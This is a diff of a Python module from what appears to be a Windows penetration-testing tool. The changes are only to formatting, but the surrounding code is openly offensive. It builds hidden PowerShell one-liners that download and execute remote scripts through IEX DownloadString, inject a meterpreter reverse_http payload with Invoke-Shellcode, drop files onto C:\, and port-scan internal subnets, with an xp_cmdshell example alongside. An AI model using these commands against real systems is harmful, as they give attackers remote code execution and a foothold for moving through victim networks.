@@ -1,6 +1,7 @@
 # encoding: utf8
 from .config import *
 
+
 class Shell:
     def __init__(self):
         self.info = {
@@ -64,7 +65,7 @@ PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuserconten
 
 PS > Get-Help Invoke-Shellcode -examples
 """
-    
+
         self.desc_portscan = u"""
 当渗透进内网机器时进行端口扫描，不用下载nmap
 
@@ -91,15 +92,15 @@ SQL> xp_cmdshell "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Obje
 """
 
     def test(self):
-      print("", self.info['Name'])
-      print(self.info['Author'])
-
+        print("", self.info['Name'])
+        print(self.info['Author'])
 
     def reverse(self):
         return "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('{url}'))"
 
     def invoke_shellcode(self):
-        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost {ip} -Lport {port} -Force".format(ip=lhost, port=port_msf)
+        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost {ip} -Lport {port} -Force".format(
+            ip=lhost, port=port_msf)
 
     def downloader(self):
         return "powershell (new-object System.Net.WebClient).DownloadFile('{url}','C:\\{file}')"
@@ -118,6 +119,3 @@ SQL> xp_cmdshell "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Obje
 
     def portscan(self):
         return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts {ip}/24 -TopPorts 100"
-
-
-
